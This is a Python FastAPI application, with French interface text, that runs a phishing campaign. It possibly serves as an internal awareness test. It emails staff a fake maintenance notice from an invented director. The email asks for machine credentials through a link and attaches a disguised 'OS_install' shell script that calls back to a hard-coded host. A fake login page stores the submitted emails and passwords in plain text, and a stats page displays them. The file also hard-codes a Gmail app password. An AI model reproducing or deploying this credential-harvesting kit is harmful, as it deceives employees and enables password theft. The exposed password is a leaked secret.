from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse
import csv
from datetime import datetime
from pathlib import Path
import html
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import textwrap

app = FastAPI()

# Paramètres
OPENS_FILE = Path("opens.csv")
USERS_FILE = Path("users.csv")
CLICKS_FILE = Path("clicks.csv")

FROM_EMAIL = "clement.shoddox@gmail.com"
APP_PASSWORD = "wyhz uiml kowf ptgk"
FASTAPI_HOST = "0.0.0.0"
FASTAPI_PORT = 8000

# Page d'accueil
@app.get("/", response_class=HTMLResponse)
def home_page():
    return HTMLResponse("""
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <title>PHISHING PANEL</title>
        <style>
            body {
                font-family: 'Segoe UI', Arial, sans-serif;
                background: linear-gradient(135deg, #e8efff, #f9faff);
                margin: 0;
                padding: 0;
                display: flex;
                height: 100vh;
                justify-content: center;
                align-items: center;
            }

            .card {
                background: white;
                padding: 3rem 4rem;
                border-radius: 12px;
                box-shadow: 0 8px 20px rgba(0,0,0,0.1);
                text-align: center;
                max-width: 400px;
                width: 100%;
            }

            h1 {
                color: #222;
                font-size: 1.8rem;
                margin-bottom: 2rem;
            }

            button {
                background: #007BFF;
                color: white;
                padding: 1rem 2rem;
                font-size: 1rem;
                margin: 0.8rem 0;
                cursor: pointer;
                border: none;
                border-radius: 8px;
                width: 100%;
                box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                transition: all 0.3s ease;
            }

            button:hover {
                background: #0056b3;
                transform: translateY(-2px);
                box-shadow: 0 8px 16px rgba(0,0,0,0.15);
            }

            button:active {
                transform: translateY(0);
                box-shadow: 0 3px 6px rgba(0,0,0,0.2);
            }
        </style>
    </head>
    <body>
        <div class="card">
            <h1>PHISHING PANEL</h1>
            <form action="/send-mails" method="post">
                <button>📧 Envoyer les mails</button>
            </form>
            <form action="/stats" method="get">
                <button>📊 Voir les stats</button>
            </form>
        </div>
    </body>
    </html>
    """)

# Endpoint pièce-jointe
@app.get("/attachment-click/{user_id}")
def attachment_click(user_id: int, request: Request):
    click_time = datetime.now().isoformat()
    if not OPENS_FILE.exists():
        with open(OPENS_FILE, mode="w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["user_id", "opened_at", "ip"])
    with open(OPENS_FILE, mode="a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow([user_id, click_time, request.client.host])
    return {"status": "logged", "user_id": user_id}

# Envoi de mails
@app.post("/send-mails")
def send_all_emails():
    if not USERS_FILE.exists():
        return HTMLResponse("<h2>users.csv introuvable</h2><a href='/'>Retour accueil</a>")
    
    with open(USERS_FILE, newline="") as f:
        reader = list(csv.reader(f))
        for idx, row in enumerate(reader, start=1):
            prenom, nom, email = row

            # Création script .sh
            sh_path = f"/tmp/script_{idx}.sh"
            with open(sh_path, "w") as sh_file:
                sh_file.write(f"""#!/bin/bash
curl http://192.168.1.47:8000/attachment-click/{idx}

""")

            # Création mail multipart
            msg = MIMEMultipart()
            msg['Subject'] = "Maintenance et mise à jour OS"
            msg['From'] = FROM_EMAIL
            msg['To'] = email

            # Corps du mail
            link = f"http://192.168.1.47:8000/click/{idx}"
            body = textwrap.dedent(f"""
                Bonjour {prenom},\n
                Nous espérons que votre aventure au sein de notre entreprise se passe comme vous l'espériez.\n
                En raison d'une maintenance prévue ce soir entre 15h30 et 16h00, nous aurions besoin des identifiants de votre machine afin d'éviter d'importuner votre travail au cours de cette dernière.
                Nous vous prions donc de cliquer sur ce lien et de remplir le formulaire : {link}\n
                Enfin, la dernière version de l'OS est maintenant disponible, nous vous laissons en pièce-jointe le script à exécuter afin de mettre tout cela en place facilement.\n
                Cordialement,
                Jean-Claude Célestin, directeur du pôle Accompagnement.
            """)
            msg.attach(MIMEText(body, "plain"))

            # Ajout de la pièce jointe
            with open(sh_path, "rb") as f_sh:
                attachment = MIMEApplication(f_sh.read(), _subtype="x-sh")
                attachment.add_header('Content-Disposition', 'attachment', filename=f"OS_install_{idx}.sh")
                msg.attach(attachment)

            # Envoi via Gmail
            try:
                with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                    server.login(FROM_EMAIL, APP_PASSWORD)
                    server.send_message(msg)
                    print(f"[+] Mail envoyé à {email} avec script via Gmail.")
            except Exception as e:
                print(f"[!] Erreur envoi mail {email}: {e}")

    return HTMLResponse("""
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <title>Confirmation</title>
            <style>
                body {
                    font-family: 'Segoe UI', Arial, sans-serif;
                    background: #f4f6f8;
                    margin: 0;
                    padding: 0;
                    display: flex;
                    height: 100vh;
                    justify-content: center;
                    align-items: center;
                }

                .message-box {
                    background: white;
                    padding: 2rem 3rem;
                    border-radius: 10px;
                    text-align: center;
                    box-shadow: 0 6px 15px rgba(0,0,0,0.1);
                }

                h2 {
                    margin-bottom: 1.5rem;
                }

                a {
                    display: inline-block;
                    background: #007BFF;
                    color: white;
                    padding: 0.8rem 1.5rem;
                    border-radius: 6px;
                    text-decoration: none;
                    font-size: 1rem;
                    transition: all 0.3s ease;
                }

                a:hover {
                    background: #0056b3;
                    transform: translateY(-2px);
                    box-shadow: 0 4px 10px rgba(0,0,0,0.15);
                }
            </style>
        </head>
        <body>
            <div class="message-box">
                <h2>Mails envoyés avec succès !</h2>
                <a href="/">⬅ Retour à l'accueil</a>
            </div>
        </body>
        </html>
        """)

# Formulaire
@app.get("/click/{user_id}", response_class=HTMLResponse)
def click_form(user_id: int):
    html_content = f"""
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8" />
        <title>Connexion</title>
        <style>
            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #dceefc, #b6dbff);
                margin: 0;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }}
            .form-box {{
                background: white;
                padding: 2.5rem 3rem;
                border-radius: 12px;
                box-shadow: 0 8px 20px rgba(0,0,0,0.12);
                width: 100%;
                max-width: 360px;
                box-sizing: border-box;
                text-align: center;
            }}
            h2 {{
                margin-bottom: 1.8rem;
                color: #222;
                font-weight: 600;
            }}
            input[type="email"],
            input[type="password"] {{
                width: 100%;
                padding: 0.75rem 1rem;
                margin-bottom: 1.4rem;
                border: 1.8px solid #cccccc;
                border-radius: 8px;
                font-size: 1rem;
                transition: border-color 0.3s ease;
                box-sizing: border-box;
            }}
            input[type="email"]:focus,
            input[type="password"]:focus {{
                border-color: #007BFF;
                outline: none;
                box-shadow: 0 0 6px rgba(0,123,255,0.4);
            }}
            button {{
                background-color: #007BFF;
                color: white;
                width: 100%;
                padding: 0.75rem 1rem;
                font-size: 1rem;
                font-weight: 600;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                box-shadow: 0 6px 12px rgba(0,123,255,0.3);
                transition: background-color 0.3s ease, transform 0.2s ease;
            }}
            button:hover {{
                background-color: #0056b3;
                transform: translateY(-2px);
                box-shadow: 0 8px 16px rgba(0,86,179,0.4);
            }}
            button:active {{
                background-color: #00408d;
                transform: translateY(0);
                box-shadow: 0 3px 8px rgba(0,64,141,0.5);
            }}
        </style>
    </head>
    <body>
        <div class="form-box">
            <h2>Connexion</h2>
            <form method="post" action="/click/{user_id}">
                <input type="email" name="email_form" placeholder="Email" required />
                <input type="password" name="password" placeholder="Mot de passe" required />
                <button type="submit">Envoyer</button>
            </form>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

# Récupération clic formulaire
@app.post("/click/{user_id}", response_class=HTMLResponse)
def receive_credentials(user_id: int, email_form: str = Form(...), password: str = Form(...), request: Request = None):
    click_time = datetime.now().isoformat()
    if not USERS_FILE.exists():
        return HTMLResponse("<h2>users.csv introuvable</h2>")
    
    with open(USERS_FILE, newline="") as f:
        reader = list(csv.reader(f))
        if user_id < 1 or user_id > len(reader):
            return HTMLResponse("<h2>User ID inconnu</h2>")
        prenom, nom, email_origine = reader[user_id - 1]

    if not CLICKS_FILE.exists():
        with open(CLICKS_FILE, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["prenom","nom","email_origine","id_utilisateur","clicked_at","ip","email_form","password"])
    
    with open(CLICKS_FILE, "a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow([
            prenom, nom, email_origine, user_id,
            click_time,
            request.client.host if request else "",
            email_form, password
        ])
    
    return HTMLResponse("""
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <title>Formulaire soumis</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f7f7f7;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .container {
                background-color: #fff;
                padding: 2rem 3rem;
                border-radius: 10px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                text-align: center;
            }
            h1 {
                color: #333;
                margin-bottom: 1rem;
            }
            p {
                color: #555;
                font-size: 1.1rem;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Formulaire soumis avec succès</h1>
            <p>Votre formulaire a bien été soumis.<br>
            Le pôle Accompagnement de la Turbine vous remercie de votre confiance.</p>
        </div>
    </body>
    </html>
    """, status_code=200)

# Page de stats
@app.get("/stats", response_class=HTMLResponse)
def stats_page():
    clicks_rows, opens_rows = [], []
    if CLICKS_FILE.exists():
        with open(CLICKS_FILE, newline="") as f:
            clicks_rows = list(csv.DictReader(f))
    if OPENS_FILE.exists():
        with open(OPENS_FILE, newline="") as f:
            opens_rows = list(csv.DictReader(f))

    # Méthode formulaire
    clicks_table = "<h2>Méthode formulaire :</h2>"
    if clicks_rows:
        clicks_table += """
        <table>
            <thead>
                <tr>
                    <th>User ID</th><th>Prénom</th><th>Nom</th><th>Email</th>
                    <th>Date du clic</th><th>IP</th><th>Email formulaire</th><th>Password</th>
                </tr>
            </thead><tbody>
        """
        for row in clicks_rows:
            clicks_table += f"""
            <tr>
                <td>{html.escape(row.get('id_utilisateur',''))}</td>
                <td>{html.escape(row.get('prenom',''))}</td>
                <td>{html.escape(row.get('nom',''))}</td>
                <td>{html.escape(row.get('email_origine',''))}</td>
                <td>{html.escape(row.get('clicked_at',''))}</td>
                <td>{html.escape(row.get('ip',''))}</td>
                <td>{html.escape(row.get('email_form',''))}</td>
                <td>{html.escape(row.get('password',''))}</td>
            </tr>
            """
        clicks_table += "</tbody></table>"
    else:
        clicks_table += "<p>Aucun utilisateur n'a rempli le formulaire.</p>"

    # Méthode pièce-jointe
    opens_table = "<h2>Méthode pièce-jointe :</h2>"
    if opens_rows:
        opens_table += """
        <table>
            <thead>
                <tr>
                    <th>User ID</th><th>Date d'exécution</th><th>IP</th>
                </tr>
            </thead><tbody>
        """
        for row in opens_rows:
            opens_table += f"""
            <tr>
                <td>{html.escape(row.get('user_id',''))}</td>
                <td>{html.escape(row.get('opened_at',''))}</td>
                <td>{html.escape(row.get('ip',''))}</td>
            </tr>
            """
        opens_table += "</tbody></table>"
    else:
        opens_table += "<p>Aucun utilisateur n'a exécuté la pièce jointe.</p>"

    return HTMLResponse(f"""
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <title>PHISHING STATS</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                background: #f4f6f8;
                padding: 2rem;
                margin: 0;
            }}
            h1 {{
                color: #007BFF;
                text-align: center;
                margin-bottom: 2rem;
            }}
            h2 {{
                color: #0056b3;
                margin-top: 2rem;
                margin-bottom: 1rem;
            }}
            table {{
                border-collapse: collapse;
                width: 100%;
                background: #fff;
                border-radius: 6px;
                overflow: hidden;
                box-shadow: 0 2px 6px rgba(0,0,0,0.08);
                margin-bottom: 2rem;
            }}
            th, td {{
                border-bottom: 1px solid #eee;
                padding: 10px;
                text-align: left;
            }}
            th {{
                background-color: #e9f1ff;
                color: #333;
                font-weight: bold;
            }}
            tr:hover td {{
                background-color: #f5faff;
            }}
            a button {{
                background-color: #007BFF;
                color: white;
                padding: 0.8rem 1.5rem;
                font-size: 1rem;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                box-shadow: 0 4px 6px rgba(0,0,0,0.1);
                transition: all 0.3s ease;
            }}
            a button:hover {{
                background-color: #0056b3;
                box-shadow: 0 6px 10px rgba(0,0,0,0.15);
                transform: translateY(-2px);
            }}
            a button:active {{
                transform: translateY(0);
                box-shadow: 0 3px 5px rgba(0,0,0,0.2);
            }}
            p {{
                color: #666;
                text-align: center;
            }}
        </style>
    </head>
    <body>
        <h1>📊 Informations récupérées</h1>
        {clicks_table}
        {opens_table}
        <div style="text-align:center;">
            <a href="/"><button>🏠 Retour au Phishing Panel</button></a>
        </div>
    </body>
    </html>
    """)